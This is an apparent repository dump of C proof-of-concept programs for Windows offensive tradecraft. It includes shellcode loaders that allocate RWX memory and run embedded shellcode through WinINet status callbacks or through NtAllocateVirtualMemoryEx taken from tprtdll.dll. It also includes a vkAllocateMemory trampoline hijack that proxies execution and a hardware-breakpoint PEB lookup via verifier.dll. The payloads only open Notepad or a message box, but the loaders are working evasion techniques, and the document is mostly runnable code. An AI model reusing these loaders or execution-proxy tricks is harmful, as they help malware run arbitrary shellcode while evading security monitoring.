Project Path: arc_whokilleddb_function-collections_ufndqab2

Source Tree:

```txt
arc_whokilleddb_function-collections_ufndqab2
├── README.md
├── hijack_callbacks
│   ├── InternetSetStatusCallback
│   │   ├── Makefile
│   │   └── main.c
│   └── vkAllocateMemory
│       ├── Makefile
│       ├── README.md
│       ├── imgs
│       │   ├── disas.png
│       │   ├── vkAllocateMemory_0_disas.png
│       │   ├── vkAllocateMemory_disas.png
│       │   └── works.png
│       └── main.c
├── miscellaneous
│   ├── Makefile
│   └── fetch_peb_using_verifier_dll.c
└── winapi_alternatives
    └── NtAllocateMemoryEx
        ├── Makefile
        └── main.c

```

`README.md`:

```md
# Function Collections

[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/whokilleddb)


A bunch of interesting functions I have found while digging through windows. 

Most of these funtions have been found using [Hoontr](https://github.com/whokilleddb/hoontr) - another tool I wrote a while back, so if like the tricks contained in this repo, or the tool itself - consider [Buying me a coffee](https://www.buymeacoffee.com/whokilleddb) to help me stay awake through more night.


```

`hijack_callbacks/InternetSetStatusCallback/Makefile`:

```
CC=x86_64-w64-mingw32-gcc
CFLAGS=-Wall -Wextra -Wconversion -Werror -O0 -m64 -g

.PHONY: all clean

all: main.c 
	$(CC) $(CFLAGS) main.c -o InternetSetStatusCallback.exe -lwininet 

clean:
	@rm -f *.exe

```

`hijack_callbacks/InternetSetStatusCallback/main.c`:

```c
/*

    This module uses InternetSetStatusCallback() to demo how we run certain functions based on things
    like: DNS name resolution, when we reach out to a certain server, when we send/receiver certain number
    of bytes, when connections are terminated, etc etc

    Tested on: Windows 11 24H2
    Author: @whokilleddb

*/
#include <windows.h>
#include <wininet.h>
#include <stdio.h>

#define UNUSED(x) (void)(x)

// notepad.exe shellcode
unsigned char shellcode[] =  {
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x6e, 0x6f, 0x74, 0x65, 0x70,
    0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00
};

DWORD shellcode_size = 0;
LPVOID exec_addr = NULL;
HANDLE hThread = NULL;

// Status callback function
void CALLBACK InternetStatusCallback(
    HINTERNET hInternet,
    DWORD_PTR dwContext,
    DWORD dwInternetStatus,
    LPVOID lpvStatusInformation,
    DWORD dwStatusInformationLength
)
{
    UNUSED(hInternet);
    UNUSED(dwContext);
    UNUSED(dwStatusInformationLength);

    switch (dwInternetStatus)
    {
    case INTERNET_STATUS_RESOLVING_NAME: 
        if (lpvStatusInformation) printf("[+] Resolving name as:\t\t%S\n", (LPCWSTR)lpvStatusInformation);
        // calculate shellcode size 
        shellcode_size = sizeof(shellcode);
        printf("[+] Shellcode size:\t\t%ld\n", shellcode_size);
        break;

    case INTERNET_STATUS_NAME_RESOLVED:
        if (lpvStatusInformation) printf("[+] Name resolved as:\t\t%s\n", (LPCSTR)lpvStatusInformation);
        // Create RWX memory
        exec_addr = VirtualAlloc(NULL, shellcode_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
        printf("[+] Allocated RWX memory to:\t0x%p\n", exec_addr);
        break;

    case INTERNET_STATUS_CONNECTING_TO_SERVER:
        printf("[+] Connecting to server\n");
        memcpy(exec_addr, shellcode, shellcode_size);
        break;

    case INTERNET_STATUS_CONNECTED_TO_SERVER:
        if (lpvStatusInformation) printf("[+] Connected to server: %s\n", (LPCSTR)lpvStatusInformation);   
        DWORD tid;
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_addr, NULL, 0, &tid);
        break;

    case INTERNET_STATUS_SENDING_REQUEST:
        printf("[+] Sending request to server\n");
        break;

    case INTERNET_STATUS_REQUEST_SENT:
        printf("[+] Sent %ld bytes as request\n", *(DWORD*)lpvStatusInformation);
        CloseHandle(hThread);
        break;

    case INTERNET_STATUS_RECEIVING_RESPONSE:
        printf("[+] Receiving response from the server\n");
        break;

    case INTERNET_STATUS_RESPONSE_RECEIVED:
        printf("[+] Received %ld bytes as response\n", *(DWORD*)lpvStatusInformation);
        break;

    case INTERNET_STATUS_REQUEST_COMPLETE:
        printf("[+] Request complete\n");
        break;

    case INTERNET_STATUS_CLOSING_CONNECTION:
        printf("[+] Closing connection\n");
        break;

    case INTERNET_STATUS_CONNECTION_CLOSED:
        printf("[+] Closed connection\n");
        break;

    default:
        break;
    }
}

int main()
{
    HINTERNET hInternet = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;

    // Initialize WinINet
    hInternet = InternetOpenA(
        "WinINet Status Callback Example/1.0",
        INTERNET_OPEN_TYPE_DIRECT,
        NULL,
        NULL,
        0
    );

    if (!hInternet)
    {
        printf("[-] InternetOpen failed: 0x%lx\n", GetLastError());
        return 1;
    }

    // Set the status callback
    INTERNET_STATUS_CALLBACK previousCallback = InternetSetStatusCallback(
        hInternet,
        InternetStatusCallback
    );

    if (previousCallback == INTERNET_INVALID_STATUS_CALLBACK)
    {
        printf("[-] InternetSetStatusCallback failed: 0x%lx\n", GetLastError());
        InternetCloseHandle(hInternet);
        return 1;
    }

   printf("[+] Status callback set successfully!\n");
    
    // Connect to a server
    hConnect = InternetConnectA(
        hInternet,
        "www.example.com",
        INTERNET_DEFAULT_HTTP_PORT,
        NULL,
        NULL,
        INTERNET_SERVICE_HTTP,
        0,
        1 
    );

    if (!hConnect)
    {
        printf("[-] InternetConnect failed: 0x%lx\n", GetLastError());
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Open an HTTP request
    hRequest = HttpOpenRequestA(
        hConnect,
        "GET",
        "/",
        NULL,
        NULL,
        NULL,
        INTERNET_FLAG_RELOAD,
        2 
    );

    if (!hRequest)
    {
        printf("[-] HttpOpenRequest failed: 0x%lx\n", GetLastError());
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return 1;
    }

    // Send the request 

    if (HttpSendRequest(hRequest, NULL, 0,NULL, 0))
    {
        // Read some response data
        printf("[+] Request sent successfully!\n");

        char buffer[1024];
        DWORD bytesRead = 0;
        InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead);
    }
    else
    {
        printf("[-] HttpSendRequest failed: 0x%lx\n", GetLastError());
        
    }

    // Clean up
    if (hRequest) InternetCloseHandle(hRequest);
    if (hConnect) InternetCloseHandle(hConnect);

    // Remove callback before closing the main handle
    InternetSetStatusCallback(hInternet, NULL);

    if (hInternet) InternetCloseHandle(hInternet);

    return 0;
}
```

`hijack_callbacks/vkAllocateMemory/Makefile`:

```
CC=x86_64-w64-mingw32-gcc
CFLAGS=-Wall -Wextra -Wconversion -Werror -O0 -m64 -g 

.PHONY: all clean

all: main.c 
	$(CC) $(CFLAGS) main.c -o vkAllocateMemory.exe

clean:
	@rm -f *.exe

```

`hijack_callbacks/vkAllocateMemory/README.md`:

```md
# vkAllocateMemory

[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/whokilleddb)

This module uses `vkAllocateMemory()` function from `vulkan-1.dll`. The `vkAllocateMemory()` function just serves as a trampoline to the unexported `vkAllocateMemory_0()` function. 

> Note: This method also works with the `vkAllocateMemory` function exported by `C:\Windows\System32\Microsoft-Edge-WebView\vulkan-1.dll` but doesn't work with the one exported by `C:\Windows\System32\Microsoft-Edge-WebView\vk_swiftshader.dll`.

Looking at the function in IDA we see the following disassembly:

For `vkAllocateMemory()`:

![](./imgs/vkAllocateMemory_disas.png)

And for `vkAllocateMemory_0()`:

![](./imgs/vkAllocateMemory_0_disas.png)

The first thing I noticed was the string:

```
vkAllocateMemory: Invalid device [VUID-vkAllocateMemory-device-parameter]
```

Using [grep.app](https://grep.app/) and searching for this string, we come across the [following code](https://github.com/KhronosGroup/Vulkan-Loader/blob/main/loader/trampoline.c) which has a definition of `vkAllocateMemory()` as:

```c
LOADER_EXPORT VKAPI_ATTR VkResult VKAPI_CALL vkAllocateMemory(VkDevice device, const VkMemoryAllocateInfo *pAllocateInfo,
                                                              const VkAllocationCallbacks *pAllocator, VkDeviceMemory *pMemory) {
    const VkLayerDispatchTable *disp = loader_get_dispatch(device);
    if (NULL == disp) {
        loader_log(NULL, VULKAN_LOADER_FATAL_ERROR_BIT | VULKAN_LOADER_ERROR_BIT | VULKAN_LOADER_VALIDATION_BIT, 0,
                   "vkAllocateMemory: Invalid device [VUID-vkAllocateMemory-device-parameter]");
        abort(); /* Intentionally fail so user can correct issue. */
    }

    return disp->AllocateMemory(device, pAllocateInfo, pAllocator, pMemory);
}
```

This loosely checks out with the IDA disassembly(which is not very reliable at times but gives us a fair idea about what is happening):

![](./imgs/disas.png)

So here is a rough idea of what _I think_ is happening.

- The function accepts a struct pointer (thanks to [@_winterknife_](https://x.com/_winterknife_) for the insight)
- It checks if the first element of that struct contains some sort of a signature (`0x10ADED040410ADED`)
- If the check fails, it terminates the program with an error message
- If the check succeeds, it invokes the member at the `0x38` offset in the struct and returns it's value


So, if we are able to create a struct which has a valid signature and a valid function pointer at the `0x38` offset and pass it to `vkAllocateMemory()`, we should be able to execute the function pointed to by the function. With this knowledge, we create the following PoC:

```c
EG_STR ex = { 0 };

ex.v1 = (DWORD64) &(ex.v2);
ex.v2 = CHECKSUM;
ex.v3 = 0x4343434343434343;
ex.v4 = 0x4444444444444444;
ex.v5 = 0x4545454545454545;
ex.v6 = 0x4646464646464646;
ex.v7 = 0x4747474747474747;
ex.v8 = 0x4848484848484848;
ex.v9 = (DWORD64)super_evil_function;

vkAllocateMemory(&ex);
```

We need to have a struct with the following nature:

- The second element contains the checksum/signature which is compared in the function in this stub:
```
mov r10, CHECKSUM
cmp [rax], r10
```
- the first element contains the _adress where the checksum is stored_. This is because if you look at the IDA graph, the `cmp` statement checks `[rax]` with `r10`, not `rax` with `r10`. Since the checksum value is stored in the second element of the struct, we store that value in the first element.
- Then, looking at the disassembly, we see that there is a `mov rax, [rax + 0x38]` before `jmp`-ing to the address store in `rax`, so we need to put our function pointer at an offset of `7*sizeof(DWORD64) = 56(0x38)` from the beginning of the struct. 
- Since the second entry(`v2`) contains the checksum, we essentially need to fill the rest of the elements from `v3` to `v8` with dummy data and finally storing the address of the function we wanna call in `v9`.

With everything in place, we should be able to call `vkAllocateMemory()` with this struct and it should call our `super_evil_function()`.

We compile and run our program and:

![](./imgs/works.png)

**IT WORKS!**

![](https://imgflip.com/s/meme/Excited-Cat.jpg)

> PS: While the original research focused only on `vkAllocateMemory()`, it was pointed by [@owengsmt](https://x.com/owengsmt) that other functions like `vkFreeMemory()` and `vkMapMemory()` also can be used for redirection using this technique. I digged a bit dipper after this and turn out that almost every ducking function from `vulkan-1.dll` can be used for code redirection as long as you get the signature and offsets right.

![](https://pbs.twimg.com/media/GzGu5k3aIAAwXrt?format=jpg&name=medium)
----




```

`hijack_callbacks/vkAllocateMemory/main.c`:

```c
/*

    This module uses vkAllocateMemory() from vulkan-1.dll to proxy shellcode execution

    Tested on: Windows 11 24H2
    Author: @whokilleddb

*/

#include <windows.h>
#include <stdio.h>

#define CHECKSUM 0x10ADED040410ADED

#define ERR(x) printf("[-] %s failed with error: 0x%lx\n", x, GetLastError())

typedef LPVOID(__stdcall* pVkAllocateMemory)(LPVOID funcptr);

typedef struct example_struct {
    DWORD64 v1;
    DWORD64 v2;
    DWORD64 v3;
    DWORD64 v4;
    DWORD64 v5;
    DWORD64 v6;
    DWORD64 v7;
    DWORD64 v8;
    DWORD64 v9;
} EG_STR;

void super_evil_function() {
    MessageBoxA(NULL, "Dark Souls2 is an amazing game", "DB Says", 0);
}

int main() {
    EG_STR ex = { 0 };
    
    ex.v1 = (DWORD64) &(ex.v2);
    ex.v2 = CHECKSUM;
    ex.v3 = 0x4343434343434343;
    ex.v4 = 0x4444444444444444;
    ex.v5 = 0x4545454545454545;
    ex.v6 = 0x4646464646464646;
    ex.v7 = 0x4747474747474747;
    ex.v8 = 0x4848484848484848;
    ex.v9 = (DWORD64)super_evil_function;

    HMODULE hVulkan = LoadLibraryW(L"vulkan-1.dll");
    if (hVulkan == NULL) {
        ERR("LoadLibraryW");
        return -1;
    }

    pVkAllocateMemory vkAllocateMemory = (pVkAllocateMemory)(LPVOID)GetProcAddress(hVulkan, "vkAllocateMemory");
    if (vkAllocateMemory == NULL) {
        ERR("vkAllocateMemory");
        return -1;
    }

    printf("[+] vkAllocateMemory() found at: 0x%p\n", vkAllocateMemory);

    vkAllocateMemory(&ex);

    return 0;
}


```

`miscellaneous/Makefile`:

```
CC=x86_64-w64-mingw32-gcc
CFLAGS=-Wall -Wextra -Wconversion -Werror -O0 -m64 -g 

.PHONY: all clean

all: fetch_peb_using_verifier_dll.c 
	$(CC) $(CFLAGS) fetch_peb_using_verifier_dll.c -o fetch_peb_using_verifier_dll.exe

clean:
	@rm -f *.exe

```

`miscellaneous/fetch_peb_using_verifier_dll.c`:

```c
/*

    This module uses VerifierDestroyRpcPageHeap() from verifier.dll to fetch PEB address

    Tested on: Windows 11 24H2
    Author: @whokilleddb

*/

#include <windows.h>
#include <stdio.h>
#include <winternl.h>

#define SEARCH_LIMIT 20			// How many bytes to search
#define RVA2VA(TYPE, BASE, RVA) (TYPE)((ULONG_PTR)BASE + RVA)
#define UNUSED(x) (void)(x)
#define ERR_PRINT(x) printf("[-] %s() failed with error: 0x%lx\n", x, GetLastError())

PPEB g_ppeb = NULL;
LPVOID g_move_qs_word_addr = NULL;
LPVOID g_next_inst_addr = NULL;

//How normal people would read PEB
PPEB NormalWayOfReadingPEB() {
	PPEB ppeb = (PPEB)__readgsqword(0x60);
	printf("[+] PEB is at:\t0x%p\n", ppeb);
	return ppeb;
}

// VEH magic for us
LONG WINAPI VectoredExceptionHandler(PEXCEPTION_POINTERS ExceptionInfo)
{
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP ||
		ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT)
	{
		// Check if we are at the *next instruction
		if (ExceptionInfo->ContextRecord->Rip == (DWORD64)g_next_inst_addr)
		{
			// RAX has the PPEB due to the previous instruction
			g_ppeb = (LPVOID)ExceptionInfo->ContextRecord->Rax;

			printf("[+] Exception caught at target address:\t\t0x%p\n", g_next_inst_addr);
			printf("[+] RAX value captured:\t\t\t\t0x%p\n", g_ppeb);
		}
	}

	return EXCEPTION_CONTINUE_SEARCH;
}

long CALLBACK ehandler(EXCEPTION_POINTERS *pointers) {
	UNUSED(pointers);
	return EXCEPTION_EXECUTE_HANDLER;
}

void PsychoPathWayOfReadingPEB() {
	if (g_ppeb) {
		printf("[+] PEB already located at:\t0x%p\n", g_ppeb);
		return;
	}

	// Add VEH
	PVOID hVeh = AddVectoredExceptionHandler(1, VectoredExceptionHandler);
	if (hVeh == NULL)
	{
		ERR_PRINT("AddVectoredException");
		return;
	}

	HMODULE hVerifier = LoadLibraryA("verifier.dll");
	if (hVerifier == NULL) {
		ERR_PRINT("LoadLibraryA");
		return;
	}

	LPVOID VerifierDestroyRpcPageHeap = (LPVOID)GetProcAddress(hVerifier, "VerifierDestroyRpcPageHeap");
	if (VerifierDestroyRpcPageHeap == NULL) {
		ERR_PRINT("GetProcAddress");
		return;
	}

	printf("\n[+] VerifierDestroyRpcPageHeap() located at:\t0x%p\n", VerifierDestroyRpcPageHeap);
	for (DWORD i = 0; i < SEARCH_LIMIT; i++) {
		if ( 
			((BYTE*)VerifierDestroyRpcPageHeap)[i] == 0x65 &&
			((BYTE*)VerifierDestroyRpcPageHeap)[i + 1] == 0x48 &&
			((BYTE*)VerifierDestroyRpcPageHeap)[i + 2] == 0x8b &&
			((BYTE*)VerifierDestroyRpcPageHeap)[i + 3] == 0x04 &&
			((BYTE*)VerifierDestroyRpcPageHeap)[i + 4] == 0x25 &&
			((BYTE*)VerifierDestroyRpcPageHeap)[i + 5] == 0x60 &&
			((BYTE*)VerifierDestroyRpcPageHeap)[i + 6] == 0x00 &&
			((BYTE*)VerifierDestroyRpcPageHeap)[i + 7] == 0x00 &&
			((WORD*)VerifierDestroyRpcPageHeap)[i + 3] == 0
			) {
			g_move_qs_word_addr = RVA2VA(LPVOID, VerifierDestroyRpcPageHeap, i);
			g_next_inst_addr = RVA2VA(LPVOID, VerifierDestroyRpcPageHeap, i + 9);
		}
	}

	if (g_move_qs_word_addr == NULL) {
		printf("[-] Could not locate opcode\n");
		return;
	}

	printf("[+] Target Opcode Found out at:\t\t\t0x%p\n", g_move_qs_word_addr);

	// Set HWBP
	CONTEXT ctx = { 0 };
	CONTEXT orig_ctx = { 0 };
	ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

	if (!GetThreadContext((HANDLE)-2, &ctx))
	{
		ERR_PRINT("GetThreadContext");
		return;
	}

	// Copy original thread context
	memcpy(&orig_ctx, &ctx, sizeof(CONTEXT));
	
	// Set DR0 to our target address
	ctx.Dr0 = (DWORD64)g_next_inst_addr;

	// Enable DR0 for execution breakpoint
	ctx.Dr7 |= 0x00000001;  // Enable DR0
	ctx.Dr7 |= 0x00000000;  // Break on execution (00 in bits 16-17)
	ctx.Dr7 &= (DWORD64)~0x00030000; // Clear size bits for DR0 (execution breakpoints ignore size)

	if (!SetThreadContext((HANDLE)-2, &ctx))
	{
		ERR_PRINT("SetThreadContext");
		return;
	}
	
    __try1 (ehandler) {
		((void (*)())g_move_qs_word_addr)();
	}
	__except1 {
		printf("[+] PEB is at:\t0x%p\n", g_ppeb);	
	}

	if (!SetThreadContext((HANDLE)-2, &orig_ctx))
	{
		ERR_PRINT("SetThreadContext");
		return;
	}

	RemoveVectoredExceptionHandler(hVeh);

}

int main() {
	PPEB n_peb = NormalWayOfReadingPEB();
	PsychoPathWayOfReadingPEB();

	if (n_peb == g_ppeb) {
		printf("\n[+] PEB addresses match up!");
	} else {
		printf("\n[-] PEB addresses do not match up!");
	}
	return 0;
}

```

`winapi_alternatives/NtAllocateMemoryEx/Makefile`:

```
CC=x86_64-w64-mingw32-gcc
CFLAGS=-Wall -Wextra -Wconversion -Werror -O0 -m64 -g 

.PHONY: all clean

all: main.c 
	$(CC) $(CFLAGS) main.c -o NtAllocateMemoryEx.exe

clean:
	@rm -f *.exe

```

`winapi_alternatives/NtAllocateMemoryEx/main.c`:

```c
/*

    This module uses NtAllocateMemoryEx to allocate RWX memory, but NOT from ntdll. The dll 
    exposes a lot of interesting functions, and some of the Nt ones are:

    NtClose, NtCreateEvent, NtDelayExecution, NtFlushProcessWriteBuffers, NtGetNextThread, 
    NtQueryInformationProcess, NtQueryInformationThread, NtResetEvent, NtSetEvent, NtTerminateProcess

    Tested on: Windows 11 24H2
    Author: @whokilleddb

*/
#include <windows.h>
#include <stdio.h>

char shellcode[] =  
    "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
    "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
    "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
    "\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
    "\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
    "\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
    "\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
    "\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
    "\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
    "\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
    "\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
    "\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
    "\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
    "\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
    "\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
    "\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
    "\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
    "\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
    "\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
    "\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
    "\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
    "\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
    "\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
    "\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
    "\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
    "\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
    "\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
    "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
    "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

typedef NTSTATUS(NTAPI* PNtAllocateVirtualMemoryEx)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG PageProtection,
    PMEM_EXTENDED_PARAMETER ExtendedParameters,
    ULONG ExtendedParameterCount);

int main() {
    HMODULE hHandle = LoadLibraryA("tprtdll.dll");
    if (hHandle == NULL) {
        printf("[-] LoadLibraryA failed with: 0x%lx\n", GetLastError());
        return -1;
    }

    PNtAllocateVirtualMemoryEx NtAllocateVirtualMemoryEx = (PNtAllocateVirtualMemoryEx)(LPVOID)GetProcAddress(hHandle, "NtAllocateVirtualMemoryEx");
    if (NtAllocateVirtualMemoryEx == NULL) {
        printf("[-] GetProcAddress failed with: 0x%lx\n", GetLastError());
        return -1;
    }

    printf("[+] NtAllocateVirtualMemoryEx() from tprtdll.dll found at: 0x%p\n", NtAllocateVirtualMemoryEx);
    
    LPVOID address = NULL;
    SIZE_T shellcode_size = sizeof(shellcode);
    NTSTATUS status = NtAllocateVirtualMemoryEx(
        (HANDLE)-1,
        &address,
        &shellcode_size,
        MEM_RESERVE | MEM_COMMIT,
        PAGE_EXECUTE_READWRITE,
        NULL,
        0
    );

    if (status != 0) {
        printf("[-] NtAllocateVirtualMemoryEx() failed with: 0x%lx\n", status);
        return -1;

    }
    printf("[+] NtAllocateVirtualMemoryEx() returned: 0x%lx\n", status);

    memcpy(address, shellcode, shellcode_size);

    DWORD tid = 0;
    HANDLE hthread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)address, NULL, 0, &tid);
    if (hthread == NULL) {
        printf("[-] CreateThread() failed: 0x%lx\n", GetLastError());
        return -1;
    }
    printf("[+] Created thread with TID: %ld\n", tid);

    WaitForSingleObject(hthread, INFINITE);
    return 0;
}
```